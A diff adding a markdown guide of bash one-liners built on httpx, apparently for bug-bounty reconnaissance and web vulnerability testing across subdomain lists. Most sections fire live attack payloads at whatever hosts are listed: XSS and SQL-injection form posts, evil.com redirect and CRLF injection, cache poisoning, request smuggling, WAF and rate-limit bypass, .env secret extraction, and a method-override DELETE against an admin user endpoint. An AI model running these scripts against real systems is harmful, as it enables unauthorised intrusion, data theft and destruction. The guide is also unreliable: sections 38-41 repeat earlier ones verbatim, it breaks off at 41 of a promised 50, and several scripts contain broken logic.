@@ -1301,5 +1301,1120 @@ EOF"
 done
 ```
 
+# 50 Creative Ways to Use HTTPx Beyond Basic Probing
 
+## 1. **Technology Stack Evolution Tracking**
+```bash
+# Track how technology changes over time
+cat subdomains.txt | httpx -silent -tech-detect -json | while read line; do
+    domain=$(echo $line | jq -r '.url')
+    tech=$(echo $line | jq -r '.["tech-detect"]')
+    echo "$(date +%Y-%m-%d),$domain,$tech" >> tech_history.csv
+    
+    # Compare with historical data
+    if grep -q "$domain" tech_history.csv; then
+        old_tech=$(grep "$domain" tech_history.csv | tail -2 | head -1 | cut -d',' -f3)
+        if [ "$old_tech" != "$tech" ]; then
+            echo "🔄 Technology change detected on $domain: $old_tech → $tech"
+        fi
+    fi
+done
+```
+
+## 2. **Hidden Development Environments Discovery**
+```bash
+# Find staging/dev environments by header analysis
+cat subdomains.txt | httpx -silent -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-Host: localhost" \
+  -header-detect -json | jq -r 'select(.headers | contains("X-Env: development") or contains("X-Staging")) | .url'
+```
+
+## 3. **Load Balancer Health Check Exploitation**
+```bash
+# Identify load balancers and check backend health
+cat subdomains.txt | httpx -silent -path "/health" -path "/status" -path "/lbcheck" \
+  -status-code -content-length | while read line; do
+    if echo "$line" | grep -q "200"; then
+        echo "⚠️ Exposed health endpoint: $line"
+        # Check if we can see backend servers
+        curl -s "$line/health" | grep -E "backend|server-ip|node" && 
+        echo "  → Backend information exposed"
+    fi
+done
+```
+
+## 4. **GraphQL Endpoint Discovery**
+```bash
+# Find GraphQL endpoints with introspection
+cat subdomains.txt | httpx -silent -path "/graphql" -path "/gql" -path "/query" -path "/api/graphql" \
+  -status-code | while read url; do
+    # Test introspection
+    introspection='{"query":"{__schema{types{name}}}"}'
+    response=$(curl -s -X POST -H "Content-Type: application/json" -d "$introspection" "$url")
+    if echo "$response" | grep -q "__schema"; then
+        echo "🔓 GraphQL introspection enabled at $url"
+        # Extract all types
+        echo "$response" | jq '.data.__schema.types[].name' | sort -u
+    fi
+done
+```
+
+## 5. **S3 Bucket Permission Analyzer**
+```bash
+# Analyze S3 bucket permissions through subdomains
+cat subdomains.txt | httpx -silent -s3-detect -json | jq -r 'select(.["s3-detected"]) | .url' | 
+while read s3_url; do
+    # Check bucket permissions
+    for method in GET PUT DELETE; do
+        response=$(curl -s -X $method -I "$s3_url")
+        if echo "$response" | grep -q "200\|204"; then
+            echo "⚠️ S3 bucket allows $method: $s3_url"
+        fi
+    done
+done
+```
+
+## 6. **Response Time Profiling for Performance Issues**
+```bash
+# Profile response times across different regions
+cat subdomains.txt | httpx -silent -response-time -json | jq -r '.url + " " + (.response_time|tostring)' | 
+while read url time; do
+    if (( $(echo "$time > 2.0" | bc -l) )); then
+        echo "🐌 Slow response: $url ($time seconds)"
+        
+        # Geolocate the server
+        ip=$(dig +short $(echo $url | cut -d'/' -f3) | head -1)
+        curl -s "http://ip-api.com/json/$ip" | jq -r '.country, .city'
+        
+        # Check CDN usage
+        curl -s -I "$url" | grep -i "cf-ray|x-amz-cf-id|x-sucuri-id" && 
+        echo "  Using CDN - investigate configuration"
+    fi
+done
+```
+
+## 7. **Open Redirect Chain Discovery**
+```bash
+# Find open redirects that could be chained
+cat subdomains.txt | httpx -silent -path "/?next=http://evil.com" -path "//google.com" \
+  -path "/redirect?url=http://evil.com" -status-code -location | while read line; do
+    if echo "$line" | grep -q "evil.com\|Location:"; then
+        echo "🔄 Open redirect found: $line"
+        
+        # Test for XSS chaining
+        xss_payload="javascript:alert(document.domain)"
+        curl -s -L "https://$domain/redirect?url=$xss_payload" | grep -q "alert" &&
+        echo "  → XSS chainable redirect"
+    fi
+done
+```
+
+## 8. **API Version Deprecation Detection**
+```bash
+# Find deprecated API versions still accessible
+cat subdomains.txt | httpx -silent -path "/v1" -path "/v2" -path "/api/v1" -path "/api/v2" \
+  -path "/v3" -md5 | while read line; do
+    url=$(echo $line | cut -d' ' -f1)
+    hash=$(echo $line | cut -d' ' -f2)
+    
+    # Check if older versions return same content
+    v1_hash=$(curl -s "$url/v1" 2>/dev/null | md5sum | cut -d' ' -f1)
+    v2_hash=$(curl -s "$url/v2" 2>/dev/null | md5sum | cut -d' ' -f1)
+    
+    if [ "$v1_hash" == "$v2_hash" ]; then
+        echo "⚠️ API version confusion: v1 and v2 identical at $url"
+    fi
+done
+```
+
+## 9. **Cache Poisoning Opportunities**
+```bash
+# Identify cache poisoning vectors
+cat subdomains.txt | httpx -silent -H "X-Forwarded-Host: evil.com" -H "X-Forwarded-Scheme: http" \
+  -H "X-Original-URL: /admin" -response-headers -json | jq -r 'select(.headers."x-cache" == "HIT") | .url' |
+while read url; do
+    echo "🎯 Potentially cacheable with header injection: $url"
+    
+    # Test cache poisoning
+    poisoned=$(curl -s -H "X-Forwarded-Host: evil.com" "$url" | grep -c "evil.com")
+    if [ $poisoned -gt 0 ]; then
+        echo "  ✅ Cache poisoning confirmed"
+    fi
+done
+```
+
+## 10. **WordPress Vulnerability Clustering**
+```bash
+# Cluster WordPress sites by vulnerability patterns
+cat subdomains.txt | httpx -silent -wp-detect -json | jq -r 'select(.["wp-detected"]) | .url' |
+while read wp_site; do
+    # Check plugin versions
+    plugins=$(curl -s "$wp_site/wp-json/wp/v2/plugins" 2>/dev/null | jq -r '.[].version')
+    
+    for plugin in $plugins; do
+        # Query vulnerability database
+        vuln=$(curl -s "https://wpscan.com/api/plugins/$plugin" | grep -c "vulnerability")
+        if [ $vuln -gt 0 ]; then
+            echo "⚠️ Vulnerable plugin $plugin v$plugin on $wp_site"
+        fi
+    done
+    
+    # Check user enumeration
+    if curl -s "$wp_site/?author=1" | grep -q "author"; then
+        echo "  → User enumeration possible"
+    fi
+done
+```
+
+## 11. **Rate Limiting Testing Across Subdomains**
+```bash
+# Test rate limiting implementations
+cat subdomains.txt | httpx -silent -threads 100 -status-code | while read url; do
+    # Rapid requests to trigger rate limiting
+    for i in {1..50}; do
+        code=$(curl -s -o /dev/null -w "%{http_code}" "$url/login")
+        if [ "$code" == "429" ] || [ "$code" == "503" ]; then
+            echo "🛑 Rate limiting active on $url after $i requests"
+            break
+        fi
+    done
+done
+```
+
+## 12. **CORS Misconfiguration Scanner**
+```bash
+# Find CORS misconfigurations
+cat subdomains.txt | httpx -silent -cors -json | jq -r 'select(.["cors"] | .allow_origin == "*") | .url' |
+while read url; do
+    echo "🔓 Wildcard CORS on $url"
+    
+    # Test credential exposure
+    response=$(curl -s -I -H "Origin: https://evil.com" "$url")
+    if echo "$response" | grep -q "Access-Control-Allow-Credentials: true"; then
+        echo "  ⚠️ Credentials allowed with wildcard origin"
+    fi
+done
+```
+
+## 13. **Subdomain Takeover Signature Database Creation**
+```bash
+# Create custom takeover signatures
+cat subdomains.txt | httpx -silent -status-code -cdn -json | jq -r 'select(.status_code == 404) | .url' |
+while read url; do
+    cname=$(dig +short CNAME $(echo $url | cut -d'/' -f3))
+    
+    case $cname in
+        *amazonaws*)
+            echo "$url -> AWS S3 bucket not found" >> takeover_signatures.txt
+            # Check if bucket is available
+            bucket_name=$(echo $cname | cut -d'.' -f1)
+            if aws s3 ls "s3://$bucket_name" 2>&1 | grep -q "NoSuchBucket"; then
+                echo "  ✅ Available for takeover"
+            fi
+            ;;
+        *azure*)
+            echo "$url -> Azure storage not found" >> takeover_signatures.txt
+            ;;
+        *github*)
+            echo "$url -> GitHub pages not found" >> takeover_signatures.txt
+            ;;
+    esac
+done
+```
+
+## 14. **Security Headers Compliance Dashboard**
+```bash
+# Generate security headers compliance report
+cat subdomains.txt | httpx -silent -header-detect -json | jq -r '.url as $url | 
+  {url: $url, 
+   hsts: .headers."strict-transport-security" // "missing",
+   csp: .headers."content-security-policy" // "missing",
+   xfo: .headers."x-frame-options" // "missing",
+   xss: .headers."x-xss-protection" // "missing"
+  }' | while read line; do
+    url=$(echo $line | jq -r '.url')
+    score=0
+    
+    # Calculate security score
+    if [ "$(echo $line | jq -r '.hsts')" != "missing" ]; then score=$((score + 25)); fi
+    if [ "$(echo $line | jq -r '.csp')" != "missing" ]; then score=$((score + 25)); fi
+    if [ "$(echo $line | jq -r '.xfo')" != "missing" ]; then score=$((score + 25)); fi
+    if [ "$(echo $line | jq -r '.xss')" != "missing" ]; then score=$((score + 25)); fi
+    
+    echo "$url: Security Headers Score: $score/100"
+    
+    if [ $score -lt 50 ]; then
+        echo "  ⚠️ Critical: Missing multiple security headers"
+        # Generate fix commands
+        echo "  Fix: Add HSTS, CSP, X-Frame-Options headers"
+    fi
+done > security_headers_report.csv
+```
+
+## 15. **Web Cache Deception Scanner**
+```bash
+# Find web cache deception vulnerabilities
+cat subdomains.txt | httpx -silent -path "/profile.php/nonexistent.css" \
+  -path "/admin/nonexistent.jpg" -path "/user/123/avatar.css" -status-code -content-type |
+while read line; do
+    url=$(echo $line | cut -d' ' -f1)
+    type=$(echo $line | cut -d' ' -f3)
+    
+    if echo "$type" | grep -q "text/html\|application/json"; then
+        echo "🎭 Web cache deception possible at $url"
+        
+        # Check if cached
+        first_response=$(curl -s -I "$url" | grep -i "x-cache:")
+        sleep 5
+        second_response=$(curl -s -I "$url" | grep -i "x-cache:")
+        
+        if [ "$first_response" == "$second_response" ] && [ ! -z "$first_response" ]; then
+            echo "  ✅ Cached response confirmed - vulnerable to deception"
+        fi
+    fi
+done
+```
+
+## 16. **API Rate Limit Bypass Detection**
+```bash
+# Test for rate limit bypass techniques
+cat subdomains.txt | httpx -silent -path "/api" -path "/v1/api" -path "/rest" | while read api_url; do
+    # Test different bypass methods
+    for header in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Originating-IP: 127.0.0.1"; do
+        for i in {1..100}; do
+            response=$(curl -s -o /dev/null -w "%{http_code}" -H "$header" "$api_url")
+            if [ "$response" == "200" ]; then
+                echo "🔓 Rate limit bypass at $api_url using $header"
+                break 2
+            fi
+        done
+    done
+done
+```
+
+## 17. **Sensitive File Exposure Finder**
+```bash
+# Search for exposed sensitive files
+cat subdomains.txt | httpx -silent \
+  -path "/.env" \
+  -path "/.git/config" \
+  -path "/.aws/credentials" \
+  -path "/wp-config.php.bak" \
+  -path "/config/database.yml" \
+  -path "/backup.sql" \
+  -path "/.svn/entries" \
+  -path "/server-status" \
+  -path "/phpinfo.php" \
+  -path "/.DS_Store" \
+  -status-code -content-length | while read line; do
+    url=$(echo $line | cut -d' ' -f1)
+    code=$(echo $line | cut -d' ' -f2)
+    
+    if [ "$code" == "200" ]; then
+        echo "🔴 EXPOSED: $url"
+        
+        # Extract sensitive data
+        case $url in
+            *.env)
+                curl -s "$url" | grep -E "DB_|PASS|KEY|SECRET" && 
+                echo "  → Database credentials exposed"
+                ;;
+            *.git/config)
+                echo "  → Git repository exposed"
+                ;;
+            *.sql)
+                size=$(curl -s "$url" | wc -c)
+                echo "  → SQL dump exposed: ${size} bytes"
+                ;;
+        esac
+    fi
+done
+```
+
+## 18. **CDN Origin IP Discovery**
+```bash
+# Find origin servers behind CDNs
+cat subdomains.txt | httpx -silent -cdn -json | jq -r 'select(.["cdn-name"]) | .url' |
+while read url; do
+    domain=$(echo $url | cut -d'/' -f3)
+    
+    # Try historical DNS
+    curl -s "https://securitytrails.com/domain/$domain/dns" | grep -E "[0-9]{1,3}\.[0-9]{1,3}" | 
+    while read ip; do
+        if ! echo "$ip" | grep -q "$(dig +short $domain)"; then
+            echo "🎯 Possible origin IP for $domain: $ip"
+            
+            # Test direct connection
+            curl -s -H "Host: $domain" "http://$ip" -I | grep -q "200" &&
+            echo "  ✅ Origin accessible directly at $ip"
+        fi
+    done
+    
+    # Try subdomain IP history
+    curl -s "https://viewdns.info/iphistory/?domain=$domain" | grep -E "[0-9]{1,3}\.[0-9]{1,3}" | 
+    sort -u | head -5
+done
+```
+
+## 19. **Form Input Validation Testing**
+```bash
+# Test form input validation across subdomains
+cat subdomains.txt | httpx -silent -forms -json | jq -r 'select(.forms) | .url' |
+while read url; do
+    # Extract form actions
+    curl -s "$url" | grep -E '<form.*action="([^"]+)"' -o | while read form; do
+        action=$(echo $form | sed 's/.*action="//; s/".*//')
+        
+        # Test XSS
+        xss_payload="<script>alert(1)</script>"
+        response=$(curl -s -X POST -d "input=$xss_payload" "$url/$action")
+        if echo "$response" | grep -q "$xss_payload"; then
+            echo "❌ XSS vulnerability at $url$action"
+        fi
+        
+        # Test SQL injection
+        sql_payload="' OR '1'='1"
+        response=$(curl -s -X POST -d "username=$sql_payload&password=test" "$url/$action")
+        if echo "$response" | grep -q "Welcome\|Dashboard\|Admin"; then
+            echo "💉 SQL injection at $url$action"
+        fi
+    done
+done
+```
+
+## 20. **HTTP/2 vs HTTP/3 Performance Comparison**
+```bash
+# Compare protocol performance
+cat subdomains.txt | httpx -silent -http2 -http3 -json | jq -r '.url' | while read url; do
+    # Test HTTP/2
+    time_h2=$(curl -s -o /dev/null -w "%{time_total}\n" --http2-prior-knowledge "$url" 2>/dev/null)
+    
+    # Test HTTP/3
+    time_h3=$(curl -s -o /dev/null -w "%{time_total}\n" --http3 "$url" 2>/dev/null)
+    
+    if [ ! -z "$time_h2" ] && [ ! -z "$time_h3" ]; then
+        improvement=$(echo "($time_h2 - $time_h3) * 100 / $time_h2" | bc -l)
+        echo "$url: HTTP/3 is ${improvement}% faster than HTTP/2"
+    fi
+done
+```
+
+## 21. **JavaScript Library Version Vulnerability Check**
+```bash
+# Check JavaScript library versions against vulnerability DB
+cat subdomains.txt | httpx -silent | while read url; do
+    curl -s "$url" | grep -E 'src="[^"]*\.js"' -o | while read js; do
+        js_url=$(echo $js | sed 's/src="//; s/"//')
+        full_url="https://$(echo $url | cut -d'/' -f3)$js_url"
+        
+        # Download and check version
+        curl -s "$full_url" | grep -E '@version|version:|jQuery v|bootstrap v' | 
+        while read version_line; do
+            if echo "$version_line" | grep -q "jQuery"; then
+                ver=$(echo "$version_line" | grep -Eo '[0-9]+\.[0-9]+\.[0-9]+')
+                # Check against known vulnerable versions
+                if [[ "$ver" =~ ^1\.[0-9]|^2\.[0-9] ]]; then
+                    echo "⚠️ Vulnerable jQuery $ver at $full_url"
+                fi
+            fi
+        done
+    done
+done
+```
+
+## 22. **HTTP Request Smuggling Detection**
+```bash
+# Detect HTTP request smuggling vulnerabilities
+cat subdomains.txt | httpx -silent -ports 80,443,8080,8443 | while read url; do
+    # Test CL.TE variant
+    response=$(curl -s -i -k -H "Transfer-Encoding: chunked" -d "5\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n0\r\n\r\n" "$url")
+    
+    if echo "$response" | grep -q "HTTP/1.1 200"; then
+        echo "🚨 HTTP Request Smuggling (CL.TE) at $url"
+    fi
+    
+    # Test TE.CL variant
+    response=$(curl -s -i -k -H "Transfer-Encoding: chunked" -d "5e\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\nContent-Length: 10\r\n\r\n0\r\n\r\n" "$url")
+    
+    if echo "$response" | grep -q "HTTP/1.1 200"; then
+        echo "🚨 HTTP Request Smuggling (TE.CL) at $url"
+    fi
+done
+```
+
+## 23. **Subdomain Content Drift Monitoring**
+```bash
+# Monitor for content changes indicating compromise
+cat subdomains.txt | httpx -silent -md5 -json | jq -r '.url + " " + .md5' > baseline.txt
+
+while true; do
+    cat subdomains.txt | httpx -silent -md5 -json | jq -r '.url + " " + .md5' > current.txt
+    
+    diff baseline.txt current.txt | grep "^>" | while read line; do
+        changed_url=$(echo $line | cut -d' ' -f2)
+        old_hash=$(grep "$changed_url" baseline.txt | cut -d' ' -f2)
+        new_hash=$(echo $line | cut -d' ' -f3)
+        
+        echo "🔴 Content changed: $changed_url"
+        echo "  Old hash: $old_hash"
+        echo "  New hash: $new_hash"
+        
+        # Check for malicious content
+        curl -s "$changed_url" | grep -E "hacked|defaced|pwned|owned" && 
+        echo "  ⚠️ Possible defacement detected"
+    done
+    
+    mv current.txt baseline.txt
+    sleep 3600  # Check hourly
+done
+```
+
+## 24. **Virtual Host Discovery**
+```bash
+# Discover virtual hosts on same IP
+cat subdomains.txt | httpx -silent -websocket -json | jq -r '.url' | 
+while read url; do
+    ip=$(dig +short $(echo $url | cut -d'/' -f3) | head -1)
+    
+    # Try common vhosts
+    for vhost in admin dev staging test api internal; do
+        response=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: $vhost.$(echo $url | cut -d'/' -f3)" "http://$ip")
+        if [ "$response" == "200" ]; then
+            echo "🎯 Vhost discovered: $vhost.$(echo $url | cut -d'/' -f3) on $ip"
+        fi
+    done
+    
+    # Check for default vhost
+    default_response=$(curl -s -I -H "Host: anything" "http://$ip" | head -1)
+    if echo "$default_response" | grep -q "200"; then
+        echo "  Default vhost accepts any Host header"
+    fi
+done
+```
+
+## 25. **TLS Cipher Suite Strength Analysis**
+```bash
+# Analyze TLS cipher strength across subdomains
+cat subdomains.txt | httpx -silent -tls-grab -json | jq -r '.url + " " + (.["tls-grab"] | tostring)' |
+while read url tls_data; do
+    weak_ciphers=0
+    
+    # Check for weak ciphers
+    if echo "$tls_data" | grep -q "RC4\|DES\|MD5\|EXPORT\|NULL"; then
+        weak_ciphers=$((weak_ciphers + 1))
+        echo "⚠️ Weak cipher detected on $url"
+    fi
+    
+    # Check TLS version
+    if echo "$tls_data" | grep -q "TLSv1.0\|TLSv1.1\|SSLv3"; then
+        echo "❌ Outdated TLS version on $url"
+        weak_ciphers=$((weak_ciphers + 2))
+    fi
+    
+    # Score the configuration
+    if [ $weak_ciphers -eq 0 ]; then
+        echo "✅ Strong TLS configuration on $url"
+    else
+        echo "  Security score: $((100 - weak_ciphers * 20))/100"
+    fi
+done
+```
+
+## 26. **HTTP Parameter Pollution Testing**
+```bash
+# Test for HTTP parameter pollution vulnerabilities
+cat subdomains.txt | httpx -silent -path "/search?q=test&q=malicious" \
+  -path "/api?user=123&user=admin" -path "/page?debug=false&debug=true" |
+while read url; do
+    # Check which parameter takes precedence
+    response=$(curl -s "$url")
+    
+    if echo "$response" | grep -q "malicious\|admin\|true"; then
+        echo "🎯 Parameter pollution possible at $url"
+        
+        # Test for server-side pollution
+        pollution_test=$(curl -s -X POST -d "user=123&user=admin" "$url")
+        if echo "$pollution_test" | grep -q "Welcome admin"; then
+            echo "  ✅ Confirmed - can escalate privileges"
+        fi
+    fi
+done
+```
+
+## 27. **HTTP Method Override Detection**
+```bash
+# Find HTTP method override vulnerabilities
+cat subdomains.txt | httpx -silent | while read url; do
+    # Test various method override headers
+    for header in "X-HTTP-Method-Override: DELETE" "X-HTTP-Method: DELETE" "X-Method-Override: DELETE"; do
+        response=$(curl -s -X POST -H "$header" -I "$url/admin")
+        
+        if echo "$response" | grep -q "200\|202\|204"; then
+            echo "🔓 Method override allowed on $url using $header"
+            
+            # Test if we can delete
+            delete_test=$(curl -s -X POST -H "$header" -w "%{http_code}" "$url/admin/user/1")
+            if [ "$delete_test" == "200" ]; then
+                echo "  ⚠️ Can perform DELETE operations via POST"
+            fi
+        fi
+    done
+done
+```
+
+## 28. **Cookie Security Analysis**
+```bash
+# Analyze cookie security configurations
+cat subdomains.txt | httpx -silent -cookie-detect -json | jq -r '.url as $url | 
+  {url: $url, cookies: .headers["set-cookie"]}' | while read line; do
+    url=$(echo $line | jq -r '.url')
+    cookies=$(echo $line | jq -r '.cookies')
+    
+    if [ "$cookies" != "null" ]; then
+        # Check Secure flag
+        if ! echo "$cookies" | grep -q "Secure"; then
+            echo "⚠️ $url: Cookies missing Secure flag"
+        fi
+        
+        # Check HttpOnly flag
+        if ! echo "$cookies" | grep -q "HttpOnly"; then
+            echo "⚠️ $url: Cookies missing HttpOnly flag"
+        fi
+        
+        # Check SameSite
+        if ! echo "$cookies" | grep -q "SameSite"; then
+            echo "⚠️ $url: Cookies missing SameSite attribute"
+        fi
+        
+        # Check for sensitive cookies
+        if echo "$cookies" | grep -q "session\|token\|auth"; then
+            cookie_name=$(echo "$cookies" | grep -o "session\|token\|auth" | head -1)
+            echo "  → Sensitive cookie: $cookie_name"
+        fi
+    fi
+done
+```
+
+## 29. **WebSocket Security Testing**
+```bash
+# Test WebSocket endpoints for security issues
+cat subdomains.txt | httpx -silent -websocket -json | jq -r 'select(.["websocket-urls"]) | .url' |
+while read url; do
+    ws_url=$(echo "$url" | sed 's/https:/wss:/; s/http:/ws:/')
+    
+    # Test for unauthenticated access
+    timeout 5 websocat "$ws_url" <<< '{"type":"ping"}' 2>/dev/null | grep -q "pong" &&
+    echo "🔓 Unauthenticated WebSocket access at $ws_url"
+    
+    # Test for message injection
+    test_msg='{"command":"admin","action":"list_users"}'
+    response=$(timeout 5 websocat "$ws_url" <<< "$test_msg" 2>/dev/null)
+    if echo "$response" | grep -q "user\|admin\|root"; then
+        echo "  ⚠️ Command injection possible via WebSocket"
+    fi
+done
+```
+
+## 30. **HTTP/2 HPACK Bomb Detection**
+```bash
+# Check for HPACK bomb vulnerability (CVE-2021-3277)
+cat subdomains.txt | httpx -silent -http2 | while read url; do
+    # Create HPACK bomb payload
+    bomb_header="x-test: $(python3 -c "print('A'*10000)")"
+    
+    response=$(curl -s -i -k --http2 -H "$bomb_header" -w "%{size_header}" "$url")
+    
+    if [ $? -eq 0 ]; then
+        header_size=$(echo "$response" | wc -c)
+        if [ $header_size -gt 1000000 ]; then
+            echo "💣 HPACK bomb vulnerability at $url (header size: $header_size)"
+        fi
+    fi
+done
+```
+
+## 31. **Open Graph Protocol Scraping for OSINT**
+```bash
+# Extract Open Graph metadata for OSINT
+cat subdomains.txt | httpx -silent | while read url; do
+    curl -s "$url" | grep -E '<meta property="og:[^"]+" content="[^"]+"' -o | 
+    while read og_tag; do
+        property=$(echo "$og_tag" | sed 's/.*property="og:\([^"]*\).*/\1/')
+        content=$(echo "$og_tag" | sed 's/.*content="\([^"]*\).*/\1/')
+        
+        case $property in
+            "title")
+                echo "$url: Page title: $content" >> osint_data.txt
+                ;;
+            "description")
+                echo "$url: Description: $content" >> osint_data.txt
+                ;;
+            "image")
+                echo "$url: Image: $content" >> osint_data.txt
+                # Download image for analysis
+                curl -s "$content" -o "images/$(basename $content)"
+                ;;
+            "email")
+                echo "📧 Email found: $content at $url" >> osint_data.txt
+                ;;
+        esac
+    done
+    
+    # Extract additional metadata
+    curl -s "$url" | grep -E '<meta name="twitter:[^"]+" content="[^"]+"' -o >> osint_data.txt
+done
+```
+
+## 32. **HTTP/3 Early Adoption Detection**
+```bash
+# Identify early adopters of HTTP/3
+cat subdomains.txt | httpx -silent -http3 -json | jq -r 'select(.["http3"]) | .url' |
+while read url; do
+    echo "🚀 HTTP/3 enabled: $url"
+    
+    # Get HTTP/3 implementation details
+    alt_svc=$(curl -s -I --http3 "$url" 2>/dev/null | grep -i "alt-svc")
+    if [ ! -z "$alt_svc" ]; then
+        echo "  ALTSVC: $alt_svc"
+        
+        # Check for QUIC version
+        if echo "$alt_svc" | grep -q "h3-29\|h3-30\|h3-31"; then
+            echo "  Using bleeding-edge HTTP/3 draft"
+        fi
+    fi
+done
+```
+
+## 33. **Broken Link Detection for SEO**
+```bash
+# Find broken links for SEO optimization
+cat subdomains.txt | httpx -silent | while read url; do
+    curl -s "$url" | grep -E 'href="([^"]+)"' -o | sed 's/href="//; s/"//' | 
+    while read link; do
+        # Normalize link
+        if [[ "$link" == http* ]]; then
+            full_link="$link"
+        elif [[ "$link" == /* ]]; then
+            full_link="${url}${link}"
+        else
+            full_link="${url}/${link}"
+        fi
+        
+        # Check if link is broken
+        status=$(curl -s -o /dev/null -w "%{http_code}" "$full_link")
+        if [ "$status" == "404" ]; then
+            echo "🔗 Broken link on $url: $full_link (404)"
+        elif [ "$status" == "500" ]; then
+            echo "🔗 Server error on $url: $full_link (500)"
+        fi
+    done
+done
+```
+
+## 34. **HTTP Request Smuggling via WebSocket Upgrade**
+```bash
+# Test for request smuggling via WebSocket upgrade
+cat subdomains.txt | httpx -silent -websocket | while read url; do
+    # Create smuggled request
+    payload="GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
+    
+    response=$(curl -s -i -k -H "Connection: Upgrade, HTTP2-Settings" \
+        -H "Upgrade: h2c" \
+        -H "HTTP2-Settings: $payload" \
+        "$url")
+    
+    if echo "$response" | grep -q "200 OK\|Admin"; then
+        echo "🚨 WebSocket upgrade smuggling at $url"
+    fi
+done
+```
+
+## 35. **Cache Timing Side-Channel Analysis**
+```bash
+# Detect cache timing side-channels
+cat subdomains.txt | httpx -silent | while read url; do
+    # First request - should miss cache
+    time1=$(curl -s -o /dev/null -w "%{time_total}" "$url/sensitive")
+    
+    sleep 1
+    
+    # Second request - might hit cache
+    time2=$(curl -s -o /dev/null -w "%{time_total}" "$url/sensitive")
+    
+    # Calculate difference
+    diff=$(echo "$time1 - $time2" | bc)
+    
+    if (( $(echo "$diff > 0.1" | bc -l) )); then
+        echo "⏱️ Cache timing difference at $url/sensitive: ${diff}s"
+        
+        # Test if we can use this to detect existence
+        time_exists=$time2
+        
+        # Test non-existent resource
+        time_missing=$(curl -s -o /dev/null -w "%{time_total}" "$url/nonexistent123")
+        
+        diff_exists=$(echo "$time_exists - $time_missing" | bc)
+        if (( $(echo "$diff_exists > 0.1" | bc -l) )); then
+            echo "  ✅ Can detect existence of sensitive resources via timing"
+        fi
+    fi
+done
+```
+
+## 36. **HTTP Response Splitting Detection**
+```bash
+# Find HTTP response splitting vulnerabilities
+cat subdomains.txt | httpx -silent | while read url; do
+    # Inject CRLF in parameter
+    response=$(curl -s -i -k "$url?test=123%0d%0aLocation:%20http://evil.com%0d%0a")
+    
+    if echo "$response" | grep -q "evil.com"; then
+        echo "🚨 HTTP Response Splitting at $url"
+        
+        # Test for cache poisoning
+        cache_response=$(curl -s -I -k "$url?test=123%0d%0aLocation:%20http://evil.com%0d%0a" | grep -i "x-cache:")
+        if echo "$cache_response" | grep -q "HIT"; then
+            echo "  ⚠️ Cache poisoning possible"
+        fi
+    fi
+done
+```
+
+## 37. **Web Application Firewall (WAF) Fingerprinting**
+```bash
+# Fingerprint WAF solutions
+cat subdomains.txt | httpx -silent | while read url; do
+    # Send malicious payload to trigger WAF
+    response=$(curl -s -i -k "$url?q=<script>alert(1)</script>")
+    
+    # Check for WAF signatures
+    if echo "$response" | grep -q "cloudflare\|cf-ray"; then
+        echo "🛡️ Cloudflare detected on $url"
+    elif echo "$response" | grep -q "akamai\|akamaighost"; then
+        echo "🛡️ Akamai detected on $url"
+    elif echo "$response" | grep -q "incapsula\|X-Iinfo"; then
+        echo "🛡️ Incapsula detected on $url"
+    elif echo "$response" | grep -q "f5\|BIG-IP"; then
+        echo "🛡️ F5 BIG-IP detected on $url"
+    elif [ "$(echo "$response" | head -1 | cut -d' ' -f2)" == "406" ]; then
+        echo "🛡️ WAF blocking (406) on $url - possible ModSecurity"
+    fi
+    
+    # Test WAF bypass techniques
+    bypass_payload="<scr<script>ipt>alert(1)</scr</script>ipt>"
+    bypass_response=$(curl -s -o /dev/null -w "%{http_code}" -k "$url?q=$bypass_payload")
+    
+    if [ "$bypass_response" == "200" ]; then
+        echo "  ⚠️ WAF bypass possible with obfuscation"
+    fi
+done
+```
+
+## 38. **HTTP/2 HPACK Bomb Detection**
+```bash
+# Check for HPACK bomb vulnerability (CVE-2021-3277)
+cat subdomains.txt | httpx -silent -http2 | while read url; do
+    # Create HPACK bomb payload
+    bomb_header="x-test: $(python3 -c "print('A'*10000)")"
+    
+    response=$(curl -s -i -k --http2 -H "$bomb_header" -w "%{size_header}" "$url")
+    
+    if [ $? -eq 0 ]; then
+        header_size=$(echo "$response" | wc -c)
+        if [ $header_size -gt 1000000 ]; then
+            echo "💣 HPACK bomb vulnerability at $url (header size: $header_size)"
+        fi
+    fi
+done
+```
+
+## 39. **Open Graph Protocol Scraping for OSINT**
+```bash
+# Extract Open Graph metadata for OSINT
+cat subdomains.txt | httpx -silent | while read url; do
+    curl -s "$url" | grep -E '<meta property="og:[^"]+" content="[^"]+"' -o | 
+    while read og_tag; do
+        property=$(echo "$og_tag" | sed 's/.*property="og:\([^"]*\).*/\1/')
+        content=$(echo "$og_tag" | sed 's/.*content="\([^"]*\).*/\1/')
+        
+        case $property in
+            "title")
+                echo "$url: Page title: $content" >> osint_data.txt
+                ;;
+            "description")
+                echo "$url: Description: $content" >> osint_data.txt
+                ;;
+            "image")
+                echo "$url: Image: $content" >> osint_data.txt
+                # Download image for analysis
+                curl -s "$content" -o "images/$(basename $content)"
+                ;;
+            "email")
+                echo "📧 Email found: $content at $url" >> osint_data.txt
+                ;;
+        esac
+    done
+    
+    # Extract additional metadata
+    curl -s "$url" | grep -E '<meta name="twitter:[^"]+" content="[^"]+"' -o >> osint_data.txt
+done
+```
+
+## 40. **HTTP/3 Early Adoption Detection**
+```bash
+# Identify early adopters of HTTP/3
+cat subdomains.txt | httpx -silent -http3 -json | jq -r 'select(.["http3"]) | .url' |
+while read url; do
+    echo "🚀 HTTP/3 enabled: $url"
+    
+    # Get HTTP/3 implementation details
+    alt_svc=$(curl -s -I --http3 "$url" 2>/dev/null | grep -i "alt-svc")
+    if [ ! -z "$alt_svc" ]; then
+        echo "  ALTSVC: $alt_svc"
+        
+        # Check for QUIC version
+        if echo "$alt_svc" | grep -q "h3-29\|h3-30\|h3-31"; then
+            echo "  Using bleeding-edge HTTP/3 draft"
+        fi
+    fi
+done
+```
+
+## 41. **Broken Link Detection for SEO**
+```bash
+# Find broken links for SEO optimization
+cat subdomains.txt | httpx -silent | while read url; do
+    curl -s "$url" | grep -E 'href="([^"]+)"' -o | sed 's/href="//; s/"//' | 
+    while read link; do
+        # Normalize link
+        if [[ "$link" == http* ]]; then
+            full_link="$link"
+        elif [[ "$link" == /* ]]; then
+            full_link="${url}${link}"
+        else
+            full_link="${url}/${link}"
+        fi
+        
+        # Check if link is broken
